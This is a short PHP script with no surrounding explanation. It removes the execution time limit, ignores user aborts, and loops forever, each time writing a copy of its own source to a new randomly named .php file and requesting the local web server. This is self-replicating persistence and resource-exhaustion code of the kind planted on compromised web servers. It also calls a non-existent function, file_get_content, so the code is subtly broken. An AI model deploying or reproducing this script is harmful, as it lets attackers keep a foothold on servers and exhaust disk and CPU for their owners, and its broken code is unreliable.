<?php

    set_time_limit(0);

    ignore_user_abort(true);

	function randstr($len=6){
		$chars='abcdefghijklmnopqrstuvwxyz0123456789';
		#characters to build the password from
		mt_srand((double)microtime()*1000000*getmypid());
		#seed the random number generater (must be done)
		$password='';
		while(strlen($password)<$len)
			$password.=substr($chars,(mt_rand()%strlen($chars)),1);
		return $password;
	}

    while(1){

        file_put_contents(randstr().'.php',file_get_content(__FILE__));

        file_get_contents("http://127.0.0.1/");

    }

?>